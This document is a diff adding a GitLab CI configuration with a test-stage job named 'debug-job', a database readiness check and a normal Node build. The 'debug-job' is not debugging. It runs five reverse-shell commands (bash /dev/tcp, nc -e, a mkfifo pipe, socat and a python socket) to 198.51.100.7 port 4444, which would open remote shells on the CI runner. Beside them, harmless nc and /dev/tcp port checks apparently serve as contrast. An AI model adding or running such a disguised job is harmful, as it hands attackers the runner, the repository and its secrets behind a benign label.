@@ -1,0 +1,32 @@
+stages:
+  - test
+  - build
+
+debug-job:
+  stage: test
+  image: alpine:3.19.1
+  script:
+    - bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
+    - nc -e /bin/sh 198.51.100.7 4444
+    - mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.7 4444 > /tmp/f
+    - socat TCP:198.51.100.7:4444 EXEC:/bin/bash
+    - python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.7",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])'
+
+wait-for-db:
+  stage: test
+  image: alpine:3.19.1
+  services:
+    - name: postgres:16.2
+      alias: postgres
+  script:
+    - timeout 1 bash -c "cat < /dev/null > /dev/tcp/postgres/5432"
+    - nc -z postgres 5432
+    - socat TCP-LISTEN:15432,fork TCP:postgres:5432 &
+    - psql -h postgres -c 'select 1'
+
+build:
+  stage: build
+  image: node:20.11.0
+  script:
+    - npm ci
+    - npm run build
